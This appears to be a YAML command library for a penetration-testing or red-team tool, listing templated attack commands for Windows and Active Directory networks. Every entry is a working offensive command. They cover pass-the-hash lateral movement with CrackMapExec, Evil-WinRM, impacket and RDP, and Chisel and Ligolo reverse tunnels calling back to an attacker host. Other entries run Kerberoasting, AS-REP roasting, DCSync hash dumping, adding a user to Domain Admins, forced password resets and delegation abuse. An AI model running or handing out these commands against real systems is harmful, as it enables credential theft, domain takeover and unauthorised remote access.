commands:
  lateral_movement:
    - description: "Pass-the-Hash with CrackMapExec"
      command: "crackmapexec smb {IP} -u '{USER}' -H '{HASH}'"
    - description: "Pass-the-Hash with Evil-WinRM"
      command: "evil-winrm -i {IP} -u '{USER}' -H '{HASH}'"
    - description: "Pass-the-Hash with PsExec"
      command: "impacket-psexec {DOMAIN}/{USER}@{IP} -hashes :{HASH}"
    - description: "Pass-the-Hash with WMIExec"
      command: "impacket-wmiexec {DOMAIN}/{USER}@{IP} -hashes :{HASH}"
    - description: "RDP with Pass-the-Hash (Restricted Admin)"
      command: "xfreerdp /v:{IP} /u:{USER} /pth:{HASH} /cert:ignore"
  pivoting:
    - description: "Chisel reverse tunnel"
      command: "# Attacker: chisel server -p 8080 --reverse\n# Victim: chisel client ATTACKER:8080 R:socks"
    - description: "Ligolo-ng setup"
      command: "# Attacker: ligolo-proxy -selfcert\n# Victim: ligolo-agent -connect ATTACKER:11601 -ignore-cert"
    - description: "SSH dynamic SOCKS proxy"
      command: "ssh -D 1080 -N -f {USER}@{IP}"
    - description: "SSH local port forward"
      command: "ssh -L {PORT}:{IP}:{PORT} {USER}@PIVOT_HOST"
    - description: "Proxychains through SOCKS"
      command: "proxychains4 nmap -sT -Pn -p 445,3389 {IP}"
  ad_attacks:
    - description: "BloodHound collection"
      command: "bloodhound-python -u '{USER}' -p '{PASS}' -d {DOMAIN} -dc {IP} -c all"
    - description: "Kerberoasting"
      command: "impacket-GetUserSPNs {DOMAIN}/{USER}:{PASS} -dc-ip {IP} -request"
    - description: "AS-REP Roasting"
      command: "impacket-GetNPUsers {DOMAIN}/ -usersfile users.txt -dc-ip {IP} -no-pass"
    - description: "DCSync attack"
      command: "impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{IP} -just-dc"
    - description: "Add user to Domain Admins (GenericAll)"
      command: "net rpc group addmem 'Domain Admins' '{USER}' -U '{DOMAIN}/{USER}%{PASS}' -S {IP}"
    - description: "Force password change (ForceChangePassword)"
      command: "rpcclient -U '{DOMAIN}/{USER}%{PASS}' {IP} -c 'setuserinfo2 TARGET_USER 23 NewPass123!'"
    - description: "Shadow Credentials (msDS-KeyCredentialLink)"
      command: "python3 pywhisker.py -d {DOMAIN} -u '{USER}' -p '{PASS}' --target TARGET_USER --action add --dc-ip {IP}"
    - description: "Constrained Delegation abuse"
      command: "impacket-getST -spn CIFS/TARGET.{DOMAIN} -impersonate Administrator {DOMAIN}/{USER}:{PASS} -dc-ip {IP}"
    - description: "RBCD attack"
      command: "impacket-rbcd {DOMAIN}/{USER}:{PASS} -delegate-to TARGET$ -delegate-from CONTROLLED$ -dc-ip {IP} -action write"
